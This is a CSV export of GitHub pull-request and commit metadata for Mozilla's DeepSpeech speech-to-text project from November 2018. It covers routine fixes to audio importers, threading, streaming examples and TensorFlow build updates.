,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
2593,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8507f992c092325c8888680e8b80316e0955c765,update with changes for swb
2594,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e47e344a8272bab0426e380e161383c6f5872a5b,added downloaders and assert checks
2595,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4efc5c6c4d5b3b3f885492d340165a9e1e00be51,tidy pep8
2596,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1737,1737,Preprocessing: use all available threads,...the limitation to 8 threads looks a bit random to me.,engelmohr,2565120,2018-11-18T20:44:22Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,113e582b8a9b44bfff7ff6ce81a005ae9437deb1,"Preprocessing: use all available threads

...the limitation to 8 threads looks a bit random to me."
2597,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1736,1736,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's),"Unfortunately `librosa.load()` can not be called with `dtype=np.float16` or `dtype=np.int16` _and_ at the same time convert to 16KHz audio internally using `resampy`. It can only convert to 16KHz audio using `resampy` and use the default type `dtype=np.float32`. It appears as if this is a bug in `librosa.load()`.

Also, `librosa.write()` can not convert from `dtype=np.float32` to 16 bits. This is a second bug in `librosa`. The maintainer of `librosa` suggests this bug is best circumvented by using `soundfile`[[1](https://github.com/librosa/librosa/issues/361#issuecomment-220010741)], which we do. ",kdavis-mozilla,12054740,2018-11-18T17:27:20Z,CONTRIBUTOR,True,4,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c903c8b19dc763c3bddfd9f98eb23fe2ebd80af,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's)
2598,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1736,1736,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's),"Unfortunately `librosa.load()` can not be called with `dtype=np.float16` or `dtype=np.int16` _and_ at the same time convert to 16KHz audio internally using `resampy`. It can only convert to 16KHz audio using `resampy` and use the default type `dtype=np.float32`. It appears as if this is a bug in `librosa.load()`.

Also, `librosa.write()` can not convert from `dtype=np.float32` to 16 bits. This is a second bug in `librosa`. The maintainer of `librosa` suggests this bug is best circumvented by using `soundfile`[[1](https://github.com/librosa/librosa/issues/361#issuecomment-220010741)], which we do. ",kdavis-mozilla,12054740,2018-11-18T17:27:20Z,CONTRIBUTOR,True,4,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba622892aafe957011ab390ae2c6f2d34af088e9,Addressed review comment
2599,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9aa23ed387439257579ac5bd9869b43ecd432248,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling)
2600,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce943dd65c73a53c024cba8be4d196e51839cc7c,Disable StepCounterHook to avoid useless warning during validation
2601,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f03669171f1563e3087999d74f26290db10a8ccd,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling)
2602,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b37f1a7aa5fbc8a3af7b71df5660d36965cad83a,Merge branch 'issue1726' of https://github.com/mozilla/DeepSpeech into issue1726
2603,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2f967ac4ddab33fda9255990bbb734f7bbb72f2,Addressed review comments
2604,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1733,1733,Fix #1731 is_chief reference from Config,,code-R,894831,2018-11-17T17:15:14Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcee7afe57aff0063822c3682fa17ea2ed532922,Fix #1731 is_chief reference from Config
2605,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1732,1732,Disable StepCounterHook to avoid useless warning during validation (Fixes #1505),,reuben,477142,2018-11-17T16:04:01Z,MEMBER,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af0620040af7d21c3509f040cf22c848b3bb903d,Disable StepCounterHook to avoid useless warning during validation
2606,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1727,1727,Remove NodeJS v11 hack,,lissyx,1645737,2018-11-16T13:46:27Z,COLLABORATOR,True,2,77,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4867d6baa444453b0dbd10b308669836496fa0ad,Remove NodeJS v11 hack
2607,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1725,1725,missing numpy,#1724 ,robmsmt,16005758,2018-11-13T21:22:12Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6e74c17bc3ce0c4cc111d72008c4a5957b2f4f3,missing numpy
2608,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1723,1723,missing self argument,issue #1722,robmsmt,16005758,2018-11-13T16:03:52Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6e06d0642b7c680af4c50be1420176238f91834,missing self argument
2609,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1721,1721,Fix ds ctcdecoder upload,,lissyx,1645737,2018-11-13T12:57:29Z,COLLABORATOR,True,27,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbd6ea73ea16dc3beba7981666891d6cdd39c34f,Build OSX ds_ctcdecoder in separate task
2610,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1721,1721,Fix ds ctcdecoder upload,,lissyx,1645737,2018-11-13T12:57:29Z,COLLABORATOR,True,27,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17b7cddaba71a7e28398ac060a99c5ad26b09005,Run CTC Decoder build on merge and expose artifacts
2611,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1719,1719,Fix minor log issue on bin/import_cv.py,"Very minor change in order to log something like 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1"" - extracting archive...`` instead of 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1.tar.gz``",celian-garcia,10258608,2018-11-10T10:23:09Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9fc6c3f59bcc21a11653245a90c7689a764116cc,"Fix log issue

Very minor change in order to log something like 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1"" - extracting archive...`` instead of 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1.tar.gz"""
2612,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1718,1718,Add example for Python streaming from mic with VAD,"#1711

Think it all works, but could use someone to test, as I don't currently have a machine with both Linux and a working microphone.",daanzu,4319503,2018-11-09T15:37:34Z,CONTRIBUTOR,True,255,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,74cebb83b6da2ba619661f076e80c32a0c651b2f,Add example for Python streaming from mic with VAD
2613,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1717,1717,fix the Evaluate error - FailedPreconditionError #1691 ,fix the Evaluate error - FailedPreconditionError #1691 ,GabrielLin,9721795,2018-11-08T15:52:52Z,NONE,False,1,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01adaff7b3be83f89df822a6d44f8c68e61843bb,fix the issue of Evaluate error - FailedPreconditionError (see above for traceback): sequence_length(0) <= xxx
2614,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1716,1716,Adding streaming API Support to the GUI Tool,"#1711 
@kdavis-mozilla Up for review :)",b-ak,4998776,2018-11-08T13:51:17Z,CONTRIBUTOR,True,249,93,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,851fb4ea900b17fc2993a83b606879a210ced86e,"Adding streaming API Support to the GUI Tool

Changes:
1. Added streaming API support to the GUI tool
2. Minor modifciations to how models are loaded upon repeated transcriptions
3. Updated to Deepspeech v0.3.0
4. Image in the documentation changed

Changes v2:
1. Added streaming support to cmd interface also"
2615,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1715,1715,Check for transcript & alphabet mis-match,"(1) added error message to text.py when the transcripts and alphabet.txt file dont match, and 
(2) a script to find the unique character set from the {train/dev/test} csv files",JRMeyer,8389864,2018-11-07T18:08:47Z,CONTRIBUTOR,True,58,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a8f88d9227be974a904f9dde25670c728204e96,"added error message to text.py when the transcripts and alphabet.txt file dont match, and a file to find the unique character set from the {train/dev/test} csv files"
2616,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1715,1715,Check for transcript & alphabet mis-match,"(1) added error message to text.py when the transcripts and alphabet.txt file dont match, and 
(2) a script to find the unique character set from the {train/dev/test} csv files",JRMeyer,8389864,2018-11-07T18:08:47Z,CONTRIBUTOR,True,58,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c274d4f62990519b4ffb8a8de288c4003262605,"reubens comments, kept newlines because prettier"
2617,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1713,1713,Fix typo exporting the wrong tensor for TFLite model,,lissyx,1645737,2018-11-07T15:53:56Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6642da05baa2a461ef0943d1ccaa2cdfd91c7ba,Fix typo exporting the wrong tensor for TFLite model
2618,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9d973a191fb0b15721b0847b18ad9c14905ee61,Create tf-master branch as WIP DeepSpeech against TensorFlow master
2619,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d28266e3555dfabab9c2da7331dcb45d71557748,Update AOT AllocMode
2620,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc4bffde6ccbeed98875dd9399df21942e0ce4de,Update TensorFlow pip requirements
2621,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1f856dadc6fcd9cd2d408eb4ebb70e68449f9e,Update AOT build with TensorFlow master
2622,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f16af70cb170366aa66522c090b9d066c7333c2,"Merge pull request #1220 from lissyx/merge-tf-master_20180208

Merge tf master 20180208"
2623,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c71120fb319368641b074c80c48bf87ca93f3a16,Merge remote-tracking branch 'upstream/master' into update-tf-master
2624,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60084bab135b11713204f4d97ace06d83c5fd4f4,"Merge pull request #1230 from lissyx/update-tf-master

Update tf master"
2625,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fbf864122a23b772f37ffcbdec6fbfa4374289,Merge remote-tracking branch 'upstream/master' into update-tf-master
2626,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24e6b0f584306d051c1a619146dc1da2d5507403,Merge remote-tracking branch 'upstream/master' into update-tf-master
2627,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60ef348587a3f3c4b28cf8f23685ed5dd77e5090,Merge remote-tracking branch 'upstream/master' into update-tf-master
2628,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f939a3440b59481b4cd7e8f619f7acf534de3017,"Merge pull request #1252 from lissyx/update-tf-master

Update tf master"
2629,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1342dc8fb7a43911e1a6bce52b38e8ef800acce2,Merge remote-tracking branch 'upstream/master' into sync-master
2630,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0372af50c2882c0fafdb9d4b94ff794e45368b4,Use proper convert_graphdef tool from master
2631,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ee1e9eea707fd2db65930f4093dec9fe8f90760,Update deps to 1.6.0-rc1
2632,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de465b2b7f4f0e2e21efa332954f20086aeed1e,Switch to new TensorFlow master
2633,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,440eed476581a04d5dae622fe21faa5f4396e7d4,"Merge pull request #1255 from lissyx/sync-master

Sync master"
2634,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f2306bef1806fa1df3475a7b2aa53e77767dea3,Merge remote-tracking branch 'upstream/master' into update-tf-master
2635,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c07e3470ba8eaff61ea0f4ec0b5a9a772e57b2a2,Update TF
2636,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7454cef4aea4f4c3d73102c1ddd98b1b4ea625eb,"Merge pull request #1263 from lissyx/update-tf-master

Update tf master"
2637,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4d343bb81ed13c1c1941965385251cc98386f7d,Merge remote-tracking branch 'upstream/master' into update-tf-master
2638,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddb065d63efb3fc4c812833f23af8c0f2074c642,"Merge pull request #1280 from lissyx/update-tf-master

Update tf master"
2639,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8daf3a3eae0eadf08c65c01aab81187ba60ad060,Merge remote-tracking branch 'upstream/master' into update-tf-master
2640,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9555743bae3cf5af87b83d0395bc7b37e1cf19b9,"Merge pull request #1285 from lissyx/update-tf-master

Update tf master

X-DeepSpeech: NOBUILD"
2641,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecdf6520358a5cc8cfeca3fb3689614159fc9f0f,Switch to new TensorFlow master artifacts
2642,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6efaddfd5d16e7b0f2dc403d361fd372712ca55,"Merge pull request #1286 from lissyx/update-tf-master

Switch to new TensorFlow master artifacts"
2643,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,326532a131a7318dde97ae12cc5e5cc3daa096c7,Merge remote-tracking branch 'upstream/master' into linaro-gcc72
2644,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,befa59b41d9d1ece857cd288512801b29d4a190f,Update TensorFlow master version
2645,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41b2da0bc370969a1c7db4726b1b05a629edf340,"Switch to GCC 7.2 from Linaro and Raspbian Stretch

Fixes #1304"
2646,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,859cafca3a4f6aec98e23e7477573a62918d3c22,"Merge pull request #1307 from lissyx/linaro-gcc72

Linaro gcc72"
2647,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,710a729dda34e0a429432506a00600a4580e7d91,Update to TensorFlow master with PYTHON_BIN_PATH forced
